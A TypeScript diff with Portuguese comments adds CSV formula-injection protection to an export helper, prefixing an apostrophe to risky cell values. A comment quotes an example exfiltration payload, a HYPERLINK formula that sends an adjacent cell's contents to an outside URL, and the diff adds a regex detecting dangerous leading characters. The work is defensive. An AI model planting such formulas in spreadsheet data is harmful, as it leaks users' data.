@@ -7,12 +7,31 @@
  * ⚠️ A página de broadcast tem um `toCsv` privado com `,` (arquivo do
  * upstream). Não foi unificado de propósito: duas cópias de quinze linhas
  * custam menos que um conflito de merge naquele arquivo.
+ *
+ * ⚠️⚠️ **Aspas NÃO protegem contra fórmula.** O Excel tira a citação do CSV
+ * e AVALIA o que começa com `=`, `+`, `-`, `@`, tabulação ou CR. O nome do
+ * contato vem do push name do WhatsApp e os campos personalizados vêm do
+ * n8n: um contato chamado `=HYPERLINK("https://…"&A1,"Clique")` viraria um
+ * link clicável que leva o conteúdo da célula vizinha embora, no
+ * computador de quem abrir a planilha (revisão do PR #123). Por isso
+ * `neutralizarFormula` põe um apóstrofo na frente — menos em número, que
+ * precisa continuar número para o Excel somar.
  */
 
 export const BOM_UTF8 = "\uFEFF";
 
+const COMECO_PERIGOSO = /^[=+\-@\t\r]/;
+/** `-12`, `+3,5`, `-1.234,56`: número negativo não é fórmula. */
+const NUMERO = /^[+-]?[\d.,\s]+$/;
+
+export function neutralizarFormula(valor: string): string {
+  if (!COMECO_PERIGOSO.test(valor)) return valor;
+  if (NUMERO.test(valor)) return valor;
+  return `'${valor}`;
+}
+
 export function paraCsv(linhas: readonly (readonly string[])[], separador = ";"): string {
-  const escapar = (valor: string) => `"${valor.replace(/"/g, '""')}"`;
+  const escapar = (valor: string) => `"${neutralizarFormula(valor).replace(/"/g, '""')}"`;
   return BOM_UTF8 + linhas.map((linha) => linha.map(escapar).join(separador)).join("\r\n") + "\r\n";
 }
 
